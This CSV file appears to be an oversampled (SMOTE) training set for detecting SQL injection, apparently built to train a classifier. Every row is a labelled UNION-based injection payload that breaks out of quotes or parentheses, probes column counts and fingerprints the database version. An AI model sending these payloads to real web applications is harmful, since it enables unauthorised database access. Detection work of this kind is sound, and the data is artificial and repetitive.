id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_001454,attack,union,"-8772%' union all select 4909,4909,4909,4909,4909,4909,4909,4909,4909#",nearest_attack_euclidean,R000024,1.3058490805915441
SMOTE_001455,attack,union,"1' union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000054,0.4730967148682086
SMOTE_001456,attack,union,"-4205' union all select 8986,8986,8986,8986,8986,8986,8986,8986,8986,8986#",nearest_attack_euclidean,R000051,0.052178742775522216
SMOTE_001457,attack,union,"-9860%"" union all select 6996,6996,6996,6996,6996,6996#",nearest_attack_euclidean,R000039,1.1851145281560407
SMOTE_001458,attack,union,"-6097%'   )    )    union all select 3990,3990,3990,3990,3990,3990--",nearest_attack_euclidean,R000057,1.0688606543823334
SMOTE_001459,attack,union,"1'  )   as hats where 2011  =  2011 union all select null,null,null,null,null#",nearest_attack_euclidean,R000027,1.535291768484693
SMOTE_001460,attack,union,"-6294"" union all select 9921,9921,9921,9921,9921,9921--",nearest_attack_euclidean,R000052,0.3503412719934791
SMOTE_001461,attack,union,"-1134 union all select 1297,1297,1297,1297,1297,1297,1297,1297,1297--",nearest_attack_euclidean,R000038,0.9339211896015257
SMOTE_001462,attack,union,"-2639""  )   where 1494  =  1494 union all select 1494--",nearest_attack_euclidean,R000045,0.5881446100625746
SMOTE_001463,attack,union," select * from users where id  =  1 union select @ 1a,version  (    )   -- 1",nearest_attack_euclidean,R000004,1.1240510949044822
SMOTE_001464,attack,union," select * from users where id  =  1 + \+*$ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000006,2.6032311753948583
SMOTE_001465,attack,union,"1' union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000054,1.0258858083082558
SMOTE_001466,attack,union,"-4373'+  (  select 'rlht' where 2285  =  2285 union all select 2285,2285,2285#",nearest_attack_euclidean,R000015,1.720852723489312
SMOTE_001467,attack,union,"-8812""  )   where 1646  =  1646 union all select 1646,1646,1646,1646,1646,1646--",nearest_attack_euclidean,R000043,0.834052110338627
SMOTE_001468,attack,union,"-1401""   )    )    union all select 3480,3480,3480,3480,3480,3480--",nearest_attack_euclidean,R000072,0.7687323883465274
SMOTE_001469,attack,union,"-5748' union all select 1224,1224,1224,1224,1224,1224,1224,1224,1224#",nearest_attack_euclidean,R000058,0.15136214270425535
SMOTE_001470,attack,union,"-1401""   )    )    union all select 3480,3480,3480,3480,3480,3480--",nearest_attack_euclidean,R000072,1.0148447209224951
SMOTE_001471,attack,union,"1  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000014,0.25297246104381055
SMOTE_001472,attack,union,"-2207%'   )    )    union all select 3339,3339,3339,3339,3339,3339#",nearest_attack_euclidean,R000073,1.337549463293706
SMOTE_001473,attack,union,"-1894'  )   union all select 8123,8123,8123,8123,8123,8123,8123,8123,8123#",nearest_attack_euclidean,R000050,0.5698099030725614
SMOTE_001474,attack,union,"-1401""   )    )    union all select 3480,3480,3480,3480,3480,3480--",nearest_attack_euclidean,R000072,1.3855380539332405
SMOTE_001475,attack,union," select * from users where id  =  1 or \<\. union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000003,2.346572732256749
SMOTE_001476,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,1.597857452586727
SMOTE_001477,attack,union,"-4205' union all select 8986,8986,8986,8986,8986,8986,8986,8986,8986,8986#",nearest_attack_euclidean,R000051,0.4559068369865014
SMOTE_001478,attack,union,"1%' union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000023,1.1332703605502283
SMOTE_001479,attack,union," select * from users where id  =  1 +$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000002,1.7686668215924073
SMOTE_001480,attack,union,"-3879' union all select 9814,9814,9814,9814,9814,9814,9814,9814,9814--",nearest_attack_euclidean,R000031,1.3178480895410871
SMOTE_001481,attack,union,"-5945'   )    )     )   union all select 4266,4266,4266,4266,4266--",nearest_attack_euclidean,R000028,0.004442359806712626
SMOTE_001482,attack,union,"-6294"" union all select 9921,9921,9921,9921,9921,9921--",nearest_attack_euclidean,R000052,0.812983901908775
SMOTE_001483,attack,union,"1  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000014,1.6593649522028298
SMOTE_001484,attack,union,"-2625""   )    )    as qfuo where 1980  =  1980 union all select 1980,1980,1980--",nearest_attack_euclidean,R000076,0.4889369307801393
SMOTE_001485,attack,union,"-6097%'   )    )    union all select 3990,3990,3990,3990,3990,3990--",nearest_attack_euclidean,R000057,1.1700175744953023
SMOTE_001486,attack,union," select * from users where id  =  1 or $ .  =  1 union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000001,0.5474895908096814
SMOTE_001487,attack,union,"-4966%"" union all select 4300,4300,4300,4300,4300,4300,4300,4300#",nearest_attack_euclidean,R000035,0.21995507638614364
SMOTE_001488,attack,union,"-9110""   )    )    union all select 2263,2263,2263,2263,2263#",nearest_attack_euclidean,R000059,1.0939698659378898
SMOTE_001489,attack,union,"1""   )    )    union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000070,0.665055887524126
SMOTE_001490,attack,union," select * from users where id  =  1 +$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000002,1.7103220685104705
SMOTE_001491,attack,union,"-5575"" union all select 8665,8665,8665,8665,8665,8665,8665--",nearest_attack_euclidean,R000017,0.2541717056150578
SMOTE_001492,attack,union,"-1401""   )    )    union all select 3480,3480,3480,3480,3480,3480--",nearest_attack_euclidean,R000072,0.8349941990098635
SMOTE_001493,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000016,1.769765042861771
SMOTE_001494,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000042,0.8573225028710008
SMOTE_001495,attack,union,"-3378%""   )    )    union all select 9357,9357,9357,9357,9357--",nearest_attack_euclidean,R000064,1.4957389256763616
SMOTE_001496,attack,union,"-5945'   )    )     )   union all select 4266,4266,4266,4266,4266--",nearest_attack_euclidean,R000028,1.2126366972072733
SMOTE_001497,attack,union,"1'  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000046,0.4602943607819231
SMOTE_001498,attack,union,"-5131'   )    )     )   union all select 4854,4854,4854,4854,4854,4854,4854#",nearest_attack_euclidean,R000049,1.908585027875977
SMOTE_001499,attack,union,"1'   )    )     )   union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000041,1.6854729370120671
SMOTE_001500,attack,union,"1""   )    )    union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000070,0.01262367488535184
SMOTE_001501,attack,union,"1'   )    )     )   union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000048,0.42702205711358404
SMOTE_001502,attack,union,"-5575"" union all select 8665,8665,8665,8665,8665,8665,8665--",nearest_attack_euclidean,R000017,0.641647434339704
SMOTE_001503,attack,union,"-1401""   )    )    union all select 3480,3480,3480,3480,3480,3480--",nearest_attack_euclidean,R000072,0.5197240809849177
SMOTE_001504,attack,union,"-3879' union all select 9814,9814,9814,9814,9814,9814,9814,9814,9814--",nearest_attack_euclidean,R000031,1.21389206700488
SMOTE_001505,attack,union," select * from users where id  =  1 or \.<$ union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000008,0.5523156980462831
SMOTE_001506,attack,union,"-8812""  )   where 1646  =  1646 union all select 1646,1646,1646,1646,1646,1646--",nearest_attack_euclidean,R000043,1.3743946492548964
SMOTE_001507,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000016,1.5680238456952025
SMOTE_001508,attack,union," select * from users where id  =  1 union select @ 1a,version  (    )   -- 1",nearest_attack_euclidean,R000004,0.4545460924599623
SMOTE_001509,attack,union," select * from users where id  =  1 +$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000002,0.7310364259239283
SMOTE_001510,attack,union,"-9860%"" union all select 6996,6996,6996,6996,6996,6996#",nearest_attack_euclidean,R000039,1.1737459324695285
SMOTE_001511,attack,union,"1' union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000054,0.7415817478944536
SMOTE_001512,attack,union,"-3116""   )    )     )   union all select 4600,4600,4600,4600--",nearest_attack_euclidean,R000063,0.1538767817119465
SMOTE_001513,attack,union,"-2639""  )   where 1494  =  1494 union all select 1494--",nearest_attack_euclidean,R000045,1.854352183081411
SMOTE_001514,attack,union,"-9156'   )    )    union all select 9110,9110,9110,9110#",nearest_attack_euclidean,R000026,0.35784376975949517
SMOTE_001515,attack,union,"-5131'   )    )     )   union all select 4854,4854,4854,4854,4854,4854,4854#",nearest_attack_euclidean,R000049,0.33146447337852347
SMOTE_001516,attack,union," select * from users where id  =  '1' + $+*$ union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000007,1.6107571585963625
SMOTE_001517,attack,union,"1 union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000022,1.214197956114524
SMOTE_001518,attack,union,"-6294"" union all select 9921,9921,9921,9921,9921,9921--",nearest_attack_euclidean,R000052,0.45572556153588706
SMOTE_001519,attack,union,"-8308""  )   union all select 3084,3084,3084,3084,3084,3084,3084,3084,3084#",nearest_attack_euclidean,R000069,0.4095308040575487
SMOTE_001520,attack,union," select * from users where id  =  '1' + $+*$ union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000007,1.7727581567908806
SMOTE_001521,attack,union," select * from users where id  =  1 union select @ $$,version  (    )   -- 1",nearest_attack_euclidean,R000011,2.1669113227873695
SMOTE_001522,attack,union,"-4711%""   )    )    union all select 6737,6737,6737,6737#",nearest_attack_euclidean,R000077,0.5603994976478028
SMOTE_001523,attack,union,"-1401""   )    )    union all select 3480,3480,3480,3480,3480,3480--",nearest_attack_euclidean,R000072,0.4896165147080599
SMOTE_001524,attack,union,"-3596'  )   union all select 5349,5349,5349,5349,5349,5349#",nearest_attack_euclidean,R000013,0.3860016716755626
SMOTE_001525,attack,union," select * from users where id  =  1 *$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000009,0.7665140130726641
SMOTE_001526,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000042,0.42753954935611294
SMOTE_001527,attack,union,"-5131'   )    )     )   union all select 4854,4854,4854,4854,4854,4854,4854#",nearest_attack_euclidean,R000049,1.635528243829402
SMOTE_001528,attack,union,"-6075' union all select 9988,9988,9988,9988,9988,9988,9988,9988,9988#",nearest_attack_euclidean,R000074,0.026094842991637317
SMOTE_001529,attack,union," select * from users where id  =  '1' union select @ 1,version  (    )   --  1'",nearest_attack_euclidean,R000005,0.5781863090672372
SMOTE_001530,attack,union,"-6294"" union all select 9921,9921,9921,9921,9921,9921--",nearest_attack_euclidean,R000052,1.3958265410324493
SMOTE_001531,attack,union,"-8073   )    )     )   union all select 4481,4481,4481,4481--",nearest_attack_euclidean,R000062,0.47663229392901185
SMOTE_001532,attack,union," select * from users where id  =  1 *$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000009,2.0906630669673407
SMOTE_001533,attack,union,"-6075' union all select 9988,9988,9988,9988,9988,9988,9988,9988,9988#",nearest_attack_euclidean,R000074,0.23058188661783735
SMOTE_001534,attack,union," select * from users where id  =  1 or $ .  =  1 union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000001,0.9883651618151734
SMOTE_001535,attack,union,"1'  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000046,0.6732871018982669
SMOTE_001536,attack,union," select * from users where id  =  1 or \.<$ union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000008,2.1953342170078534
SMOTE_001537,attack,union," select * from users where id  =  1 *$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000009,1.3572377316885942
SMOTE_001538,attack,union,"1'   )    )     )   union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000041,1.8897664879946818
SMOTE_001539,attack,union,"-2639""  )   where 1494  =  1494 union all select 1494--",nearest_attack_euclidean,R000045,0.5477010411835833
SMOTE_001540,attack,union,"1   )    )     )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000029,0.03644005292541702
SMOTE_001541,attack,union,"1%' union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000036,0.06687263011192231
SMOTE_001542,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000066,0.8761581295192583
SMOTE_001543,attack,union,"1%' union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000036,0.7771456526594457
SMOTE_001544,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,0.5709477532336669
SMOTE_001545,attack,union,"1  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000014,0.16882724584331213
SMOTE_001546,attack,union,"-3997'+  (  select 'avjk' where 1917  =  1917 union all select 1917,1917,1917--",nearest_attack_euclidean,R000061,1.8627179970411336
SMOTE_001547,attack,union,"-4330' union all select 3059,3059,3059,3059,3059,3059,3059,3059,3059--",nearest_attack_euclidean,R000075,0.22343279097054364
SMOTE_001548,attack,union,1'  )   as gogu where 4338  =  4338 union all select null#,nearest_attack_euclidean,R000040,0.6484536002626623
SMOTE_001549,attack,union," select * from users where id  =  1 + \+*$ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000006,0.8038361533100401
SMOTE_001550,attack,union,"-2207%'   )    )    union all select 3339,3339,3339,3339,3339,3339#",nearest_attack_euclidean,R000073,0.6355805266341389
SMOTE_001551,attack,union,"1 union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000022,1.266570666156262
SMOTE_001552,attack,union,"1' where 2774  =  2774 union all select null,null,null,null,null#",nearest_attack_euclidean,R000060,0.05331620649787064
SMOTE_001553,attack,union,"-4589""  )   union all select 1441,1441,1441,1441,1441,1441,1441,1441,1441,1441--",nearest_attack_euclidean,R000037,1.0381802510122249
SMOTE_001554,attack,union,"-5945'   )    )     )   union all select 4266,4266,4266,4266,4266--",nearest_attack_euclidean,R000028,0.9286726760803474
SMOTE_001555,attack,union,"1%""   )    )    union all select null,null,null,null,null--",nearest_attack_euclidean,R000065,1.1387195653570532
SMOTE_001556,attack,union,"1""  )   as boeh where 2571  =  2571 union all select null#",nearest_attack_euclidean,R000056,0.6151406685625994
SMOTE_001557,attack,union,"-4542 union all select 1249,1249,1249,1249,1249,1249,1249,1249,1249--",nearest_attack_euclidean,R000025,0.7888520155324119
SMOTE_001558,attack,union,"-6075' union all select 9988,9988,9988,9988,9988,9988,9988,9988,9988#",nearest_attack_euclidean,R000074,0.10415115311945704
SMOTE_001559,attack,union,"1%' union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000032,0.2791912753059471
SMOTE_001560,attack,union,"1%""   )    )    union all select null,null,null,null,null--",nearest_attack_euclidean,R000065,0.965419576584052
SMOTE_001561,attack,union,"-3378%""   )    )    union all select 9357,9357,9357,9357,9357--",nearest_attack_euclidean,R000064,0.8911310670766706
SMOTE_001562,attack,union,"1""   )    )    union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000070,1.0106887261155042
SMOTE_001563,attack,union,"-4542 union all select 1249,1249,1249,1249,1249,1249,1249,1249,1249--",nearest_attack_euclidean,R000025,0.5737004470183374
SMOTE_001564,attack,union,"1'  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000018,1.0729453115000247
SMOTE_001565,attack,union,"-6294"" union all select 9921,9921,9921,9921,9921,9921--",nearest_attack_euclidean,R000052,1.1036125702466655
SMOTE_001566,attack,union,"1%' union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000023,1.0641969041322807
SMOTE_001567,attack,union,"-3370""  )   union all select 7845,7845,7845,7845,7845,7845#",nearest_attack_euclidean,R000019,1.5576539346028946
SMOTE_001568,attack,union,"-3116""   )    )     )   union all select 4600,4600,4600,4600--",nearest_attack_euclidean,R000063,0.8014108154013598
SMOTE_001569,attack,union,"1'+  (  select vlut where 9517  =  9517 union all select null,null,null--",nearest_attack_euclidean,R000021,0.021749765267740317
SMOTE_001570,attack,union,"-1134 union all select 1297,1297,1297,1297,1297,1297,1297,1297,1297--",nearest_attack_euclidean,R000038,1.1232204644146755
SMOTE_001571,attack,union,"-3879' union all select 9814,9814,9814,9814,9814,9814,9814,9814,9814--",nearest_attack_euclidean,R000031,1.3287721062282036
SMOTE_001572,attack,union,"1'  )   as hats where 2011  =  2011 union all select null,null,null,null,null#",nearest_attack_euclidean,R000027,1.3990348110791904
SMOTE_001573,attack,union,"-2639""  )   where 1494  =  1494 union all select 1494--",nearest_attack_euclidean,R000045,0.16910895665189157
SMOTE_001574,attack,union,"-4542 union all select 1249,1249,1249,1249,1249,1249,1249,1249,1249--",nearest_attack_euclidean,R000025,1.5505279411171713
SMOTE_001575,attack,union,"1'  )   as hats where 2011  =  2011 union all select null,null,null,null,null#",nearest_attack_euclidean,R000027,0.045956631483692424
SMOTE_001576,attack,union," select * from users where id  =  '1' union select @ 1,version  (    )   --  1'",nearest_attack_euclidean,R000005,0.8766292725708494
SMOTE_001577,attack,union," select * from users where id  =  '1'<@$$ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000010,1.5936379323468362
SMOTE_001578,attack,union," select * from users where id  =  '1'<@$$ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000010,0.598308660999213
SMOTE_001579,attack,union,"-4711%""   )    )    union all select 6737,6737,6737,6737#",nearest_attack_euclidean,R000077,1.120683619210008
SMOTE_001580,attack,union,"-9110""   )    )    union all select 2263,2263,2263,2263,2263#",nearest_attack_euclidean,R000059,0.24918725663184496
SMOTE_001581,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000042,2.0049761840678566
SMOTE_001582,attack,union,"1' where 2774  =  2774 union all select null,null,null,null,null#",nearest_attack_euclidean,R000060,0.7561050448657824
SMOTE_001583,attack,union,"1'   )    )     )   union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000041,1.0429863259183094
SMOTE_001584,attack,union,"-4966%"" union all select 4300,4300,4300,4300,4300,4300,4300,4300#",nearest_attack_euclidean,R000035,1.2960879038601356
SMOTE_001585,attack,union,"-4542 union all select 1249,1249,1249,1249,1249,1249,1249,1249,1249--",nearest_attack_euclidean,R000025,0.09992761596974557
SMOTE_001586,attack,union,"1   )    )     )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000029,0.3149662276566297
SMOTE_001587,attack,union,"1'+  (  select vlut where 9517  =  9517 union all select null,null,null--",nearest_attack_euclidean,R000021,0.24707694486097465
SMOTE_001588,attack,union,"-4373'+  (  select 'rlht' where 2285  =  2285 union all select 2285,2285,2285#",nearest_attack_euclidean,R000015,0.6267390903297086
SMOTE_001589,attack,union,"-5748' union all select 1224,1224,1224,1224,1224,1224,1224,1224,1224#",nearest_attack_euclidean,R000058,0.5492844680932228
SMOTE_001590,attack,union,"1%' union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000023,0.1885896504114414
SMOTE_001591,attack,union,"-4205' union all select 8986,8986,8986,8986,8986,8986,8986,8986,8986,8986#",nearest_attack_euclidean,R000051,0.15756091530850175
SMOTE_001592,attack,union," select * from users where id  =  1 + \+*$ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000006,0.40381618261634583
SMOTE_001593,attack,union,"-6294"" union all select 9921,9921,9921,9921,9921,9921--",nearest_attack_euclidean,R000052,0.6848925604009911
SMOTE_001594,attack,union,"-3370""  )   union all select 7845,7845,7845,7845,7845,7845#",nearest_attack_euclidean,R000019,1.1100042887130204
SMOTE_001595,attack,union," select * from users where id  =  1 union select @ $$,version  (    )   -- 1",nearest_attack_euclidean,R000011,0.5999361777007731
SMOTE_001596,attack,union,"-3370""  )   union all select 7845,7845,7845,7845,7845,7845#",nearest_attack_euclidean,R000019,0.1726127489963809
SMOTE_001597,attack,union,"-8772%' union all select 4909,4909,4909,4909,4909,4909,4909,4909,4909#",nearest_attack_euclidean,R000024,1.2027975592857567
SMOTE_001598,attack,union,"-3879' union all select 9814,9814,9814,9814,9814,9814,9814,9814,9814--",nearest_attack_euclidean,R000031,0.253727734665594
SMOTE_001599,attack,union,"1' where 2774  =  2774 union all select null,null,null,null,null#",nearest_attack_euclidean,R000060,0.8849389972071688
SMOTE_001600,attack,union," select * from users where id  =  1 +$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000002,0.5016334450678754
SMOTE_001601,attack,union,"1""  )   where 2088  =  2088 union all select null,null,null,null--",nearest_attack_euclidean,R000053,0.5612192294078139
SMOTE_001602,attack,union,"1'  )   as hats where 2011  =  2011 union all select null,null,null,null,null#",nearest_attack_euclidean,R000027,0.8392370870004628
SMOTE_001603,attack,union,"1%' union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000032,1.643398067677711
SMOTE_001604,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000066,1.1636800680498807
SMOTE_001605,attack,union,"1' union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000054,0.7151005196103899
SMOTE_001606,attack,union,"-4330' union all select 3059,3059,3059,3059,3059,3059,3059,3059,3059--",nearest_attack_euclidean,R000075,0.351228537610348
SMOTE_001607,attack,union,"1""  )   as boeh where 2571  =  2571 union all select null#",nearest_attack_euclidean,R000056,0.05287435936933291
SMOTE_001608,attack,union,"1%""   )    )    union all select null,null,null,null,null#",nearest_attack_euclidean,R000044,0.07248600840281584
SMOTE_001609,attack,union,"1'  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000018,0.6685995651218809
SMOTE_001610,attack,union,"-3879' union all select 9814,9814,9814,9814,9814,9814,9814,9814,9814--",nearest_attack_euclidean,R000031,0.7287121278999494
SMOTE_001611,attack,union,"-9860%"" union all select 6996,6996,6996,6996,6996,6996#",nearest_attack_euclidean,R000039,0.9250450914611793
SMOTE_001612,attack,union," select * from users where id  =  '1'<@$$ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000010,0.34088245422017044
SMOTE_001613,attack,union,"1'+  (  select vlut where 9517  =  9517 union all select null,null,null--",nearest_attack_euclidean,R000021,0.5355058064632946
SMOTE_001614,attack,union," select * from users where id  =  1 or \<\. union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000003,1.197291053261084
SMOTE_001615,attack,union,"1%' union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000023,0.7345828159895429
SMOTE_001616,attack,union,"-3596'  )   union all select 5349,5349,5349,5349,5349,5349#",nearest_attack_euclidean,R000013,0.9922261901169366
SMOTE_001617,attack,union,"-2190'  )   where 8890  =  8890 union all select 8890,8890#",nearest_attack_euclidean,R000078,0.5071440258287578
SMOTE_001618,attack,union,"-4542 union all select 1249,1249,1249,1249,1249,1249,1249,1249,1249--",nearest_attack_euclidean,R000025,1.2094708768643545
SMOTE_001619,attack,union," select * from users where id  =  '1' union select @ 1,version  (    )   --  1'",nearest_attack_euclidean,R000005,0.0056934012464100936
SMOTE_001620,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000016,0.6284489810684201
SMOTE_001621,attack,union,"1%""   )    )    union all select null,null,null,null,null#",nearest_attack_euclidean,R000044,0.14392295538243888
SMOTE_001622,attack,union,"1'   )    )     )   union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000041,0.4779724322968583
SMOTE_001623,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,0.33457249107382314
SMOTE_001624,attack,union,"-9110""   )    )    union all select 2263,2263,2263,2263,2263#",nearest_attack_euclidean,R000059,1.7859339628974649
SMOTE_001625,attack,union,"-5748' union all select 1224,1224,1224,1224,1224,1224,1224,1224,1224#",nearest_attack_euclidean,R000058,0.7677933384120414
SMOTE_001626,attack,union,"-4542 union all select 1249,1249,1249,1249,1249,1249,1249,1249,1249--",nearest_attack_euclidean,R000025,1.0015000228830293
SMOTE_001627,attack,union,"1'   )    )     )   union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000041,1.1650458797020136
SMOTE_001628,attack,union," select * from users where id  =  1 union select @ 1a,version  (    )   -- 1",nearest_attack_euclidean,R000004,0.04326855279725732
SMOTE_001629,attack,union,"-6097%'   )    )    union all select 3990,3990,3990,3990,3990,3990--",nearest_attack_euclidean,R000057,0.16416584254202074
SMOTE_001630,attack,union,"1  )   where 7815  =  7815 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000034,0.6884658030337321
SMOTE_001631,attack,union,"-5131'   )    )     )   union all select 4854,4854,4854,4854,4854,4854,4854#",nearest_attack_euclidean,R000049,0.41152835167261237
SMOTE_001632,attack,union,"-8772%' union all select 4909,4909,4909,4909,4909,4909,4909,4909,4909#",nearest_attack_euclidean,R000024,1.042641247156933
SMOTE_001633,attack,union," select * from users where id  =  1 or \.<$ union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000008,0.013901584747339732
SMOTE_001634,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000066,1.3211554658623008
SMOTE_001635,attack,union," select * from users where id  =  1 + \+*$ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000006,1.441937090127251
SMOTE_001636,attack,union,"1  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000014,0.1758044103287081
SMOTE_001637,attack,union,"1%'  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000020,0.08429359669861547
SMOTE_001638,attack,union,"-9860%"" union all select 6996,6996,6996,6996,6996,6996#",nearest_attack_euclidean,R000039,2.047642245489003
SMOTE_001639,attack,union,"-8772%' union all select 4909,4909,4909,4909,4909,4909,4909,4909,4909#",nearest_attack_euclidean,R000024,1.254804663870476
SMOTE_001640,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,0.4825568229720247
SMOTE_001641,attack,union,"1'  )   as hats where 2011  =  2011 union all select null,null,null,null,null#",nearest_attack_euclidean,R000027,1.4010131332265852
SMOTE_001642,attack,union,"-2207%'   )    )    union all select 3339,3339,3339,3339,3339,3339#",nearest_attack_euclidean,R000073,0.52893779439422
SMOTE_001643,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000016,1.292692314495603
SMOTE_001644,attack,union,"1'  )   as hats where 2011  =  2011 union all select null,null,null,null,null#",nearest_attack_euclidean,R000027,0.4977440205470061
SMOTE_001645,attack,union,"-6097%'   )    )    union all select 3990,3990,3990,3990,3990,3990--",nearest_attack_euclidean,R000057,0.9073551602879043
SMOTE_001646,attack,union,"1""  )   as boeh where 2571  =  2571 union all select null#",nearest_attack_euclidean,R000056,1.847535503454467
SMOTE_001647,attack,union,"-2207%'   )    )    union all select 3339,3339,3339,3339,3339,3339#",nearest_attack_euclidean,R000073,1.1091714239420123
SMOTE_001648,attack,union,"-6075' union all select 9988,9988,9988,9988,9988,9988,9988,9988,9988#",nearest_attack_euclidean,R000074,0.11599314126513563
SMOTE_001649,attack,union,"-3879' union all select 9814,9814,9814,9814,9814,9814,9814,9814,9814--",nearest_attack_euclidean,R000031,1.7912338435814212
SMOTE_001650,attack,union,"1""   )    )    union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000070,1.0580606111274007
SMOTE_001651,attack,union,"1%' union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000023,0.6466020067173621
